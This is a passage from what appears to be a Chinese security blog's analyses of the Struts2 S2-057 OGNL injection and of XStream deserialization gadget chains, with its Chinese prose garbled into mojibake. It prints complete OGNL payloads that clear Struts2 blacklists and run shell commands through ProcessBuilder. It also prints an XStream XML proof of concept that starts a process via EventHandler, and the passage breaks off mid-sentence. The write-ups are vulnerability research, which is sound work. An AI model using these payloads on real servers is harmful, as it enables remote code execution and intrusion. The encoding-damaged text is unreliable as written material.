ServletActionRedirectResultä¼šå°†namespaceä¸€èµ·æ‹¼æ¥è¿›locationï¼Œæ¯”å¦‚/s2vuls/${1*2}/s2057.action,å…¶namespaceä¸º/${1*2},actionNameä¸ºè·³è½¬çš„testï¼Œæœ€ç»ˆlocationä¸º/${1*2}/test.actionã€‚åˆ°è¿™é‡Œæˆ‘ä»¬å°±å¼•å…¥äº†OGNLè¡¨è¾¾å¼ï¼Œçœ‹åç»­çš„ä¸€ä¸ªå¤„ç† org.apache.struts2.dispatcher.StrutsResultSupport#execute åˆ°è¿™é‡Œï¼Œå°±å¼€å§‹ç†Ÿæ‚‰èµ·æ¥äº†ï¼Œå°±æ˜¯S2-012çš„æ¼æ´è§¦å‘ç‚¹ ä¼ å…¥äº†TextParseUtil.translateVariablesï¼Œåˆ°è¿™é‡Œå°±ç»“æŸäº†ï¼Œåç»­å°†è°ƒç”¨OGNL.getValue POCåœ¨2.3.xç‰ˆæœ¬ï¼Œå¯ä»¥ç›´æ¥ç”¨S2-045çš„pocæ‰“ 1/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D%27whoami%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D/s2057.action è€Œå¯¹äº2.5.xç‰ˆæœ¬ï¼Œæˆ‘ä»¬éœ€è¦å¥½å¥½åˆ†æä¸€ä¸‹ 123456789101112131415$&#123;(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.setExcludedClasses('')).(#ou.setExcludedPackageNames('')).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct.setMemberAccess(#dm)).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125; ä»pocæ¥çœ‹ï¼Œä»ç¬¬7è¡Œå¼€å§‹éƒ½æ˜¯æˆ‘ä»¬ç†Ÿæ‚‰çš„æ“ä½œï¼Œé‚£ä¹ˆå‰é¢å¤šäº†é‚£ä¹ˆå¤šæ˜¯åœ¨åšä»€ä¹ˆï¼Ÿ å‚è€ƒï¼šhttps://paper.seebug.org/794/#35-struts-2516 åœ¨struts2 2.5.13ç‰ˆæœ¬ä¹‹åï¼Œognlåº“è¿›è¡Œäº†æ›´æ–°ï¼Œä»3.1.12-&gt;3.1.15ï¼Œå…¶ä¸»è¦çš„ä¸€ä¸ªå˜åŒ–æ˜¯ç¦æ­¢è®¿é—®context.mapï¼ŒOgnlContextçš„getã€putã€removeå‡½æ•°ä¸­éƒ½åˆ é™¤äº†å¯¹å½“å‰contextçš„æ“ä½œ æ­¤å¤–ï¼Œexcludedç›¸å…³çš„é›†åˆè¢«è®¾ç½®ä¸ºä¸å¯å˜ï¼Œæ— æ³•é€šè¿‡clearçš„æ–¹å¼æ¥æ¸…é™¤ é’ˆå¯¹ä¸Šé¢ä¸¤ç§çš„ç»•è¿‡ æ–‡ç« æå‡ºäº†è¿™ä¹ˆä¸€ç§æ€è·¯: æ²¡æœ‰åŠæ³•ä½¿ç”¨context.mapï¼Œå¯ä»¥è°ƒç”¨attrï¼Œå‰æ–‡è¯´è¿‡atträ¸­ä¿å­˜ç€æ•´ä¸ªcontextçš„å˜é‡ä¸æ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡atträ¸­çš„æ–¹æ³•è¿”å›ç»™æˆ‘ä»¬ä¸€ä¸ªcontext.mapã€‚ æ²¡æœ‰åŠæ³•ç›´æ¥è°ƒç”¨excludedClassesï¼Œä¹Ÿå°±ä¸èƒ½ä½¿ç”¨clearæ–¹æ³•æ¥æ¸…ç©ºï¼Œä½†æ˜¯è¿˜å¯ä»¥åˆ©ç”¨setteræ¥æŠŠexcludedClassesç»™è®¾ç½®æˆç©º æ¸…ç©ºäº†é»‘åå•ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨DefaultMemberAccessæ¥è¦†ç›–_memberAccessï¼Œæ¥æ‰§è¡Œé™æ€æ–¹æ³•äº†ã€‚ è€Œè¿™é‡Œåˆä¼šå‡ºç°ä¸€ä¸ªé—®é¢˜ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨OgnlUtilçš„setExcludedClasseså’ŒsetExcludedPackageNameså°†é»‘åå•ç½®ç©ºæ—¶å¹¶éæ˜¯å¯¹äºæºï¼ˆå…¨å±€çš„OgnlUtilï¼‰è¿›è¡Œç½®ç©ºï¼Œä¹Ÿå°±æ˜¯è¯´_memberAccessæ˜¯æºæ•°æ®çš„ä¸€ä¸ªå¼•ç”¨ï¼Œå°±åƒå‰æ–‡æ‰€è¯´çš„ï¼Œåœ¨æ¯æ¬¡createActionæ—¶éƒ½æ˜¯é€šè¿‡setOgnlUtilåˆ©ç”¨å…¨å±€çš„æºæ•°æ®åˆ›å»ºä¸€ä¸ªå¼•ç”¨ï¼Œè¿™ä¸ªå¼•ç”¨å°±æ˜¯ä¸€ä¸ªMemberAccesså¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯_memberAccessã€‚æ‰€ä»¥è¿™é‡Œåªä¼šå½±å“è¿™æ¬¡è¯·æ±‚çš„OgnlUtilè€Œå¹¶æœªé‡æ–°åˆ›å»ºä¸€ä¸ªæ–°çš„_memberAccesså¯¹è±¡ï¼Œæ‰€ä»¥æ—§çš„_memberAccesså¯¹è±¡ä»æœªæ”¹å˜ã€‚ è€Œçªç ´è¿™ç§é™åˆ¶çš„æ–¹å¼å°±æ˜¯å†æ¬¡å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œå°†ä¸Šä¸€æ¬¡è¯·æ±‚å·²ç»ç½®ç©ºçš„OgnlUitlä½œä¸ºæºé‡æ–°åˆ›å»ºä¸€ä¸ª_memberAccessï¼Œè¿™æ ·åœ¨ç¬¬äºŒæ¬¡è¯·æ±‚ä¸­_memberAccesså°±æ˜¯é»‘åå•è¢«ç½®ç©ºçš„æƒ…å†µï¼Œè¿™ä¸ªæ—¶å€™å°±é‡Šæ”¾äº†DefaultMemberAccessï¼Œå°±å¯ä»¥è¿›è¡Œæ­£å¸¸çš„è¦†ç›–ä»¥åŠæ‰§è¡Œé™æ€æ–¹æ³•ã€‚ çœ‹è¿‡ä¸Šé¢çš„åˆ†æåå†æ¥çœ‹pocï¼Œç¬¬äºŒè¡Œè·å–äº†contextï¼Œç¬¬3 4 5 6è¡Œæ¸…é™¤äº†excludedç›¸å…³çš„é›†åˆï¼Œä½†å…¶å½“å‰çš„è¯·æ±‚é»‘åå•è¿˜æ˜¯å­˜åœ¨çš„ï¼Œæ‰€ä»¥åœ¨2.5.xç‰ˆæœ¬æˆ‘ä»¬éœ€è¦å‘é€ä¸¤æ¬¡è¿™ä¸ªpocï¼Œç¬¬ä¸€æ¬¡æ¸…æ¥šé»‘åå•ï¼Œç¬¬äºŒæ¬¡è¦†ç›–_memberAccesså¹¶è°ƒç”¨é™æ€å‡½æ•° 0x03 æ€»ç»“ åœ¨åˆ†æè¿‡ç¨‹ä¸­ï¼Œå‚è€ƒäº†å¾ˆå¤šå¸ˆå‚…ä»¬çš„ç¬”è®°ï¼Œè¿™é‡Œç‰¹åˆ«æ„Ÿè°¢ä¸€ä¸‹XD ä»æ•´ä¸ªs2æ¼æ´çš„å†ç¨‹æ¥çœ‹ï¼Œèƒ½çœ‹åˆ°å¾ˆå¤šæ¼æ´å…¶å®åˆ©ç”¨ç‚¹æ˜¯ç›¸ä¼¼çš„ï¼Œåªæ˜¯è¯´ä»å“ªä¸ªå…¥å£è¿›å»å¯èƒ½æœ‰æ‰€ä¸åŒã€‚è¿™ç§æ¼æ´çš„åˆ†ææˆ‘è®¤ä¸ºç”¨æ•°æ®æµåˆ†ææ˜¯éå¸¸åˆé€‚çš„ã€‚lgtmçš„å¸ˆå‚…å°±ç”¨äº†ä»–ä»¬çš„codeqlå‘ç°äº†S2-057è¿™ä¸ªæ¼æ´ã€‚ ä½†æ˜¯å®˜æ–¹åœ¨ä¸€æ¬¡æ¬¡ä¿®å¤ä¸­ï¼Œå¯¹äºognlè¡¨è¾¾å¼çš„æ‰§è¡Œé™åˆ¶çš„è¶Šæ¥è¶Šå¤šï¼Œä½¿å¾—å¦‚ä»Šå°±ç®—å‡ºç°ognlè¡¨è¾¾å¼æ³¨å…¥ä¹Ÿå¾ˆéš¾é€ æˆRCEçš„æ•ˆæœã€‚ è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç›´æ¥çœ‹lucifaerå¸ˆå‚…çš„é‚£ç¯‡æ–‡ç«  ä»æ—¶é—´çº¿æ¥çœ‹ï¼Œ struts2 2.3.14.1ä¹‹å‰ï¼Œognlè¡¨è¾¾å¼æ‰§è¡Œæ²¡æœ‰ä»€ä¹ˆéšœç¢ï¼›2.3.14.1å¢åŠ äº†SecurityMemberAccessï¼Œç¦æ­¢é™æ€å‡½æ•°æ‰§è¡ŒallowStaticMethodAccess=falseï¼Œåœ¨ognlè¡¨è¾¾å¼é‡Œé¢å¯ä»¥é‡æ–°ç½®ä¸ºtrueï¼›åç»­è¿™ä¸ªå€¼è¢«æ”¹æˆäº†finalï¼Œæ— æ³•è¢«æ›´æ”¹ struts2 2.3.20ä¹‹å‰ï¼Œè™½ç„¶ä¸èƒ½æ”¹allowStaticMethodAccessï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡æ„é€ å‡½æ•°çš„æ–¹å¼ç»•è¿‡ï¼›2.3.20ä¹‹åï¼Œå¢åŠ äº†é»‘åå• struts2 2.3.29ä¹‹å‰ï¼Œé€šè¿‡`#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS`è¿™ç§æ–¹å¼åˆå§‹åŒ–ï¼Œæ¸…ç©ºé»‘åå•ï¼›2.3.29ä¹‹åï¼Œæ–°å¢äº†é»‘åå•ï¼Œé™åˆ¶äº†è¿™ç§æ–¹å¼çš„æ‰§è¡Œ struts2 2.3.34/2.5.16ä¹‹å‰ï¼Œé€šè¿‡containerå®ä¾‹åŒ–ognlUtilï¼Œæ¸…ç©ºé»‘åå•ï¼Œè¯¦ç»†è§S2-045ï¼›ä¹‹åç¦æ­¢äº†context.mapçš„è®¿é—®å’ŒexcludedClassesä¸å¯å˜ï¼Œä¸èƒ½é€šè¿‡clearæ¸…æ¥š struts2 2.5.17ä¹‹å‰ï¼Œé€šè¿‡requestä¸­è·å–contextï¼Œç»•è¿‡context.mapç¦æ­¢è®¿é—®çš„é™åˆ¶ï¼Œè¯¦ç»†è§S2-057ï¼›ä¹‹åæ–°å¢äº†é»‘åå•ï¼Œå®Œå…¨ç¦æ­¢é€šè¿‡ognlçš„åŒ…æ¥å¯¹stackåšæ“ä½œ åç»­å‡ ä¸ªç‰ˆæœ¬ä¹Ÿæ›´æ–°äº†å¾ˆå¤šå®‰å…¨æªæ–½ï¼Œå…·ä½“è§lucifaerå¸ˆå‚…çš„æ–‡ç«  åœ¨åˆ†æå®Œstruts2ä¹‹åï¼Œä¹Ÿæ”¹å˜äº†å¯¹å¾ˆæœ‰åçš„æ¼æ´çš„æ„Ÿå®˜ï¼Œä»¥å‰æ€»è§‰å¾—strutsæ¼æ´éƒ½æ˜¯æ¯”è¾ƒå¤æ‚çš„ï¼Œä½†æ˜¯ç°åœ¨æƒ³æƒ³æœ‰ç²¾å½©å¤æ‚çš„åœ°æ–¹ä¹Ÿä¼šæœ‰å¾ˆå‚»çš„åœ°æ–¹ã€‚ ä¸èƒ½å¯¹è¿˜æ²¡æœ‰åˆ†æè¿‡çš„æ¡†æ¶æˆ–è€…åº”ç”¨æŒæœ‰ç•æƒ§ä¹‹å¿ƒï¼Œå…±å‹‰XD"},{"title":"å›é¡¾XStreamååºåˆ—åŒ–æ¼æ´","permalink":"http://blog.0kami.cn/2020/04/18/java/talk-about-xstream-deserialization/","text":"0x00 å‰è¨€ XStreamä¹Ÿæ˜¯ä¸€æ¬¾ç”¨çš„æ¯”è¾ƒå¤šçš„åºåˆ—åŒ–ç»„ä»¶ï¼Œå¯ä»¥å°†objectè½¬åŒ–ä¸ºXMLå¹¶èƒ½å®Œæ•´çš„è¿˜åŸå›æ¥ã€‚ä»–ä¹Ÿæ›¾ç»å‡ºç°è¿‡ååºåˆ—åŒ–æ¼æ´ï¼Œæœ¬æ–‡ä¸»è¦æ•´ç†XStreamç›¸å…³çš„å®‰å…¨é—®é¢˜XD 0x01 åŸºç¡€çŸ¥è¯† XStreamçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¸»è¦ä¾é toXMLå‡½æ•°å’ŒfromXMLå‡½æ•°ï¼Œå¦‚ä¸‹ä»£ç æ‰€ç¤º 1234567891011Person person = new Person(\"tom\", 18);XStream xStream = new XStream();String xml = xStream.toXML(person);// object to xmlSystem.out.println(xml);System.out.println(xStream.fromXML(xml)); // xml to object// è¾“å‡º// &lt;objects.Person&gt;// &lt;name&gt;tom&lt;/name&gt;// &lt;age&gt;18&lt;/age&gt;// &lt;/objects.Person&gt;// objects.Person@369f73a2 å…³äºXStreamçš„fromXMLåˆ†æçœ‹è¿™ç¯‡æ–‡ç« ï¼ŒXStreamä¼šå»è°ƒç”¨ä¸åŒçš„Convertersæ¥å¤„ç†è¿˜åŸçš„è¿‡ç¨‹ã€‚ XStreamååºåˆ—åŒ–åŒfastjsonè¿™ç§ä¸ä¸€æ ·çš„åœ°æ–¹æ˜¯fastjsonä¼šåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¸»åŠ¨å»è°ƒç”¨getterså’Œsettersï¼Œè€ŒXStreamçš„ååºåˆ—åŒ–è¿‡ç¨‹ä¸­èµ‹å€¼éƒ½æœ‰Javaçš„åå°„æœºåˆ¶æ¥å®Œæˆï¼Œæ‰€ä»¥å¹¶æ²¡æœ‰è¿™æ ·ä¸»åŠ¨è°ƒç”¨çš„ç‰¹æ€§ã€‚ ä½†æ˜¯è¿˜æœ‰ä¸€ç§åˆ©ç”¨æ–¹å¼ï¼Œå›æƒ³ä¸€ä¸‹ï¼Œåœ¨å‡ æ¡å¸¸è§„çš„javaååºåˆ—åŒ–åˆ©ç”¨é“¾ä¸Šï¼Œéƒ½åˆ©ç”¨äº†HashMapã€PriorityQueueç­‰å¯¹è±¡ï¼ˆkeyä¸å¯é‡å¤ç­‰ç‰¹æ€§ï¼‰ä¼šè‡ªåŠ¨å»è°ƒç”¨hashCodeã€equalã€compareToç­‰è¿™ç§å‡½æ•°ã€‚ ä»¥è¿™ç§æƒ³æ³•æ¥çœ‹XStreamååºåˆ—åŒ–ï¼Œå½“æˆ‘ä»¬å¯¹Mapè¿™ç§ç±»å‹çš„å¯¹è±¡è¿›è¡Œè¿˜åŸçš„æ—¶å€™ï¼Œæ˜¯å¦ä¹ŸåŒæ ·ä¼šå»è°ƒç”¨ä¸Šé¢æåˆ°çš„å‡ ç§å‡½æ•°ï¼Ÿæ¥ä¸‹æ¥ï¼Œçœ‹å‡ ä¸ªConverterçš„å¤„ç†ï¼š 1. MapConverteræ¥çœ‹çœ‹é’ˆå¯¹Mapç±»å‹è¿˜åŸçš„Converter com.thoughtworks.xstream.converters.collections.MapConverter#unmarshal populateMapå‡½æ•°ä¼šå»å¤„ç†åç»­çš„å€¼ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥æ¥çœ‹å…·ä½“putçš„åœ°æ–¹ com.thoughtworks.xstream.converters.collections.MapConverter#putCurrentEntryIntoMap è¿™é‡Œtargetä½œä¸ºæ¥æ”¶è€…ï¼Œä¼šè°ƒç”¨Mapçš„putå‡½æ•°ï¼Œåç»­å°±æ˜¯æˆ‘ä»¬ç†Ÿæ‚‰çš„å¯¹keyè°ƒç”¨hashCodeå‡½æ•° 2. TreeSet/TreeMapConverterè¿™é‡ŒTreeSetå’ŒTreeMapä¸€èµ·è®²ï¼Œå› ä¸ºTreeSetæœ¬èº«å°±æ˜¯ä¸€ä¸ªåªç”¨ä¸Šäº†Keyçš„TreeMapï¼›TreeSetConverterçš„ååºåˆ—åŒ–å¤„ç†ä¹Ÿæ˜¯å…ˆè½¬åŒ–ä¸ºTreeMapConverterçš„æ–¹å¼æ¥ä¼˜å…ˆè¿˜åŸTreeSeté‡Œçš„TreeMapï¼Œå†å¡«å……åˆ°TreeSeté‡Œã€‚ ä»TreeSetConverteræ¥è®² ä»treesetä¸­å–å‡ºfield treemapåï¼Œå»è¿›ä¸€æ­¥è°ƒç”¨TreeMapConverteræ¥è¿˜åŸTreeMap com.thoughtworks.xstream.converters.collections.TreeMapConverter#populateTreeMap è¿™é‡Œå…ˆç”¨soredMapæ¥å¡«å……éœ€è¦è¿˜åŸçš„Entryï¼Œåç»­å°†è°ƒç”¨TreeMap.putAll æœ€ç»ˆä¼šè°ƒç”¨åˆ°java.util.AbstractMap#putAll è¿™é‡Œçš„putå‡½æ•°ä¸ºTreeMap.put,ä¸çœ‹å…·ä½“çš„ä»£ç äº†ï¼Œä»–çš„ä¸»è¦åŠŸèƒ½å°±æ˜¯å¡«å……æ•°æ®ï¼Œå¹¶ä¸”åœ¨å¡«å……æ—¶å°†ä¼šæ¯”è¾ƒå½“å‰å­˜åœ¨keyï¼Œå¦‚æœæ˜¯ç›¸åŒçš„keyï¼Œåˆ™æ›¿æ¢åŸæœ‰è€çš„å€¼ã€‚è¿™ä¸ªè¿‡ç¨‹ä¼šå»è°ƒç”¨keyçš„compareToå‡½æ•° 3. DynamicProxyConverterè¿˜éœ€è¦æåŠçš„æ˜¯XStreamè¿˜æ”¯æŒå¯¹åŠ¨æ€ä»£ç†çš„æ–¹å¼è¿›è¡Œè¿˜åŸ è¿™é‡Œçš„è¿˜åŸè¿‡ç¨‹ä¸è¯´äº†ï¼Œæˆ‘ä»¬ä¸»è¦çš„å…³æ³¨ç‚¹æ˜¯ä½¿ç”¨ProxyåŠ¨æ€ä»£ç†ï¼Œæˆ‘ä»¬å¯ä»¥æ‰©å±•å‰é¢ä¸¤ç§çš„è‡ªåŠ¨è°ƒç”¨å‡½æ•°çš„æ”»å‡»é¢ï¼Œä¸‹ä¸€ç« ä¼šä¸¾EventHandlerçš„ä¾‹å­ 0x02 ç°æœ‰å‡ ç§åˆ©ç”¨åˆ†æç»“åˆä¸Šé¢åŸºç¡€çŸ¥è¯†ä¸­æåˆ°çš„å‡ ä¸ªConverterï¼Œæˆ‘ä»¬æƒ³è¦åˆ©ç”¨XStreamååºåˆ—åŒ–æ¼æ´çš„è¯ï¼Œå¾—å»å……åˆ†åˆ©ç”¨å‰é¢æåˆ°çš„å‡ ä¸ªä¼šè‡ªåŠ¨è°ƒç”¨çš„å‡½æ•° 1. EventHandlerXStreamååºåˆ—åŒ–ç”¨çš„æœ€å¤šçš„EventHandlerï¼Œæ¥çœ‹çœ‹ä»–çš„invokeå‡½æ•° ä¸»è¦å®ç°åœ¨invokeInternalå‡½æ•°å†… é¦–å…ˆéœ€è¦åˆ¤æ–­æ­¤æ—¶è°ƒç”¨çš„å‡½æ•°æ˜¯å¦ä¸ºhashCodeã€equalsã€toStringï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œé‡‡ç”¨ä»¥ä¸‹çš„æ–¹å¼æ¥å¤„ç†ã€‚ ä½†æ˜¯æˆ‘ä»¬éœ€è¦åˆ©ç”¨çš„æ˜¯invokeInternalå‡½æ•°åç»­çš„éƒ¨åˆ†ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨çš„æ—¶å€™ä¸èƒ½ç”¨å®ƒæ¥è°ƒç”¨ä¸Šé¢çš„3ä¸ªå‡½æ•°ï¼Œæ„å‘³ç€æˆ‘å‰é¢æåˆ°çš„Mapçš„æ–¹å¼ï¼Œä¸é€‚åˆç”¨åœ¨è¿™ä¸ªåœ°æ–¹ï¼›è€ŒTreeSetè¿™ç§è°ƒç”¨compareToå‡½æ•°ï¼Œå¯ä»¥ç”¨æ¥ç»§ç»­å¾€ä¸‹èµ°ã€‚ ç»§ç»­å¾€ä¸‹çœ‹ åç»­çš„å°±æ˜¯ç»å…¸çš„javaåå°„æœºåˆ¶æ¥å®ç°å‡½æ•°è°ƒç”¨ï¼Œå¹¶ä¸”è¿™é‡Œçš„targetå’Œactionéƒ½æ˜¯å¯æ§çš„ã€‚ è¿™é‡Œéœ€è¦æ³¨æ„ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œè¿™é‡Œactionå‡½æ•°å‚æ•°æ˜¯æœ‰è¦æ±‚çš„ï¼ˆçœ‹452è¡Œåˆ°461è¡Œï¼‰ æ— å‚æ•° å•ä¸ªå‚æ•°ï¼Œä¸”å‚æ•°çš„ç±»å‹ä¸ºComparableï¼Œå¹¶ä¸”è¿™ä¸ªactionå‡½æ•°æ˜¯å¯åˆ©ç”¨çš„ ç¬¬2ç§è¿˜æ²¡æœ‰æ‰¾åˆ°è¿™æ ·å¯åˆ©ç”¨çš„å‡½æ•°ï¼Œè¿™é‡Œçš„ç¬¬ä¸€ç§å¯ä»¥æä¸¤ç§ï¼š é…ç½®å¥½cmdçš„ProcessBuilderï¼Œactionå¡«start é…ç½®å¥½rmi urlçš„JdbcRowSetImplï¼Œactionå¡«getDatabaseMetaDataï¼Œè¿™é‡Œå¯ä»¥ä¸¾ä¸€åä¸‰ï¼Œä¸»è¦æ€è·¯å°±æ˜¯å¯åˆ©ç”¨çš„getters ç°åœ¨å†æ¥çœ‹çœ‹å…·ä½“çš„POC 123456789101112131415&lt;sorted-set&gt; &lt;string&gt;foo&lt;/string&gt; &lt;dynamic-proxy&gt; &lt;!-- Proxy åŠ¨æ€ä»£ç†ï¼Œhandlerä½¿ç”¨EventHandler --&gt; &lt;interface&gt;java.lang.Comparable&lt;/interface&gt; &lt;handler class=\"java.beans.EventHandler\"&gt; &lt;target class=\"java.lang.ProcessBuilder\"&gt; &lt;command&gt; &lt;string&gt;open&lt;/string&gt; &lt;string&gt;/System/Applications/Calculator.app&lt;/string&gt; &lt;/command&gt; &lt;/target&gt; &lt;action&gt;start&lt;/action&gt; &lt;/handler&gt; &lt;/dynamic-proxy&gt;&lt;/sorted-set&gt; 2. Groovy ConvertedClosureåˆ©ç”¨æ¡ä»¶ï¼šgroovy &lt;= 2.4.3ï¼Œåœ¨åç»­çš„ç‰ˆæœ¬é‡Œï¼ŒMethodClosureä¸å…è®¸ååºåˆ—åŒ–è°ƒç”¨ã€‚ é™¤äº†ä¸Šé¢è¿™ç§EventHandlerçš„åŠ¨æ€ä»£ç†æ–¹å¼ï¼ŒGroovyçš„ConvertedClosureä¹ŸåŒæ ·å¯ä»¥è¾¾åˆ°è¿™ç§æ•ˆæœ MethodClosureå½“å‰MethodClosureçš„ä¸»è¦ä½œç”¨å°±æ˜¯å°è£…æˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„å¯¹è±¡ï¼Œæ¯”å¦‚ 1new MethodClosure(Runtime.getRuntime(), \"exec\"); å°è£…Runtimeå¯¹è±¡ï¼Œå¹¶è®¾å®šåç»­éœ€è¦è°ƒç”¨çš„å‡½æ•°exec ConvertedClosureè¿™ä¸ªConvertedClosureä¹Ÿæ˜¯ç»§æ‰¿äº†InvocationHandlerï¼Œå¯ä»¥åœ¨åŠ¨æ€ä»£ç†ä¸­ä½œä¸ºhandlerçš„å­˜åœ¨ï¼Œæ¥çœ‹ä¸€ä¸‹ä»–çš„invoke ConvertedClosureè°ƒç”¨çš„æ˜¯çˆ¶ç±»org.codehaus.groovy.runtime.ConversionHandler#invoke ä¸»è¦çœ‹è¿™ä¸ªéƒ¨åˆ†ï¼Œå¯¹äºå½“å‰è°ƒç”¨çš„å‡½æ•°ï¼Œå¦‚æœéObjectçš„å‡½æ•°(å¦‚toStringã€hashCodeç­‰)ï¼Œå¹¶ä¸”ä¸æ˜¯GroovyObjectçš„å‡½æ•°ï¼Œä¼šå»è°ƒç”¨å­ç±»çš„invokeCustomï¼Œè¿™é‡Œçœ‹org.codehaus.groovy.runtime.ConvertedClosure#invokeCustom è¿™é‡Œçš„å±æ€§éƒ½æ˜¯å¯æ§çš„ï¼Œä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥å»è°ƒç”¨å»è°ƒç”¨å‰é¢æ„é€ å¥½çš„MethodClosureï¼Œè¿™é‡Œåç»­è°ƒç”¨callçš„è¿‡ç¨‹å¯ä»¥çœ‹æœ€è¿‘çš„è¿™ç¯‡æ–‡ç«  æ‰€ä»¥ä¸ºäº†æ»¡è¶³èƒ½è°ƒç”¨invokeCustomå‡½æ•°ï¼Œå‰é¢çš„ä¸¤ç§MapConverterå’ŒTreeSetConverterï¼Œé€‰å“ªç§å‘¢ï¼Ÿ å¾ˆæ˜æ˜¾ç­”æ¡ˆæ˜¯é€‰æ‹©TreeSetConverterï¼Œå› ä¸ºMapä¼šå»è°ƒç”¨hashCodeï¼Œè€ŒTreeSetä¼šå»è°ƒç”¨compareToï¼Œè¿™é‡Œçš„hashCodeæ˜¯Objectçš„å‡½æ•°ï¼Œè¿‡ä¸äº†ä¸Šé¢checkMethodï¼Œå…·ä½“æ€ä¹ˆå†™POCï¼Œä¸è¯¦ç»†è¯´äº†ï¼Œè§ysomap PSï¼šè¿™é‡Œéœ€è¦æä¸€ä¸‹çš„æ˜¯ç”±äºcompareToä¼šå¸¦ä¸Šä¸€ä¸ªå‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬MethodClosureå°è£…çš„åç»­éœ€è¦è°ƒç”¨çš„å‡½æ•°å¿…é¡»è¦å­˜åœ¨ä¸€ä¸ªStringç±»å‹çš„å‚æ•°ï¼Œä¸ç„¶ä¼šæ‰¾ä¸åˆ°å‡½æ•°æŠ¥é”™ã€‚ï¼ˆå¯èƒ½è¿˜æœ‰å…¶ä»–çš„è§£å†³æ–¹æ³•ï¼Œè¿™é‡Œæˆ‘æ²¡ç»§ç»­æ·±å…¥ä¸‹å»äº†ï¼Œç›´æ¥æ„é€ Runtime.execå¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼‰ 3. Groovy Expandoå‰é¢ç”¨åˆ°äº†TreeSetçš„æ–¹å¼ï¼Œè¿™é‡Œæˆ‘ä»¬å»ä½¿ç”¨Mapçš„ç±»å‹æ¥è§¦å‘ã€‚ä»¥Mapçš„ç±»å‹æ¥è§¦å‘ï¼Œé‚£å°±æ˜¯æ‰¾å¯ä»¥åˆ©ç”¨çš„hashCodeå‡½æ•° groovy.util.Expando#hashCode å¦‚æœåœ¨ç±»å±æ€§expandoPropertiesä¸­å­˜åœ¨hashCode:methodclosureçš„å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œç›´æ¥è°ƒç”¨MethodClosureçš„callå‡½æ•°ï¼Œè·Ÿä¸Šé¢ConvertedClosureåç»­çš„è°ƒç”¨ä¸€æ ·ï¼Œä½†æ˜¯è¿™é‡Œè°ƒç”¨æ—¶æ²¡æœ‰å‡½æ•°å‚æ•°è¿‡æ¥ï¼Œæ‰€ä»¥è¿™é‡Œçš„æ€è·¯æ˜¯ProcessBuilder.startæˆ–è€…fastjsoné‚£ç§gettersçš„åˆ©ç”¨ï¼Œè§POC 4. ImageIO$ContainsFilterä¸Šé¢ä½¿ç”¨åŠ¨æ€ä»£ç†çš„æ–¹å¼åˆ©ç”¨äº†TreeSetè°ƒç”¨putæ—¶è§¦å‘çš„compareToï¼Œè€Œè¿™é‡Œåˆ©ç”¨çš„æ˜¯HashMapç±»å‹putæ—¶è°ƒç”¨çš„hashCodeå‡½æ•°ï¼›è¿™ä¸ªé“¾ç›¸å¯¹æ¥è¯´å¤æ‚ä¸€ç‚¹ï¼Œæˆ‘ä»¬ä¸€ç‚¹ä¸€ç‚¹æ¥è¯´ï¼ˆå‚è€ƒmarshalsecçš„ImageIOï¼Œè¿™é‡Œå…ˆè†œä¸€æ³¢å¤§ä½¬çš„æ€è·¯ï¼Œåæ–‡ä¸ºé¡ºåŠ¿è®²ä¸‹å»çš„ï¼Œä¸»è¦ç›®çš„æ˜¯åˆ°è¾¾Iterator.nextï¼Œå®é™…æŒ–æ˜è¿™ç§é“¾è¿˜æ˜¯å¾—ä»åå¾€å‰æ‰¾ï¼‰ï¼š ä»XStreamå¤„ç†Mapç±»å‹æ—¶è§¦å‘hashCodeå¼€å§‹ 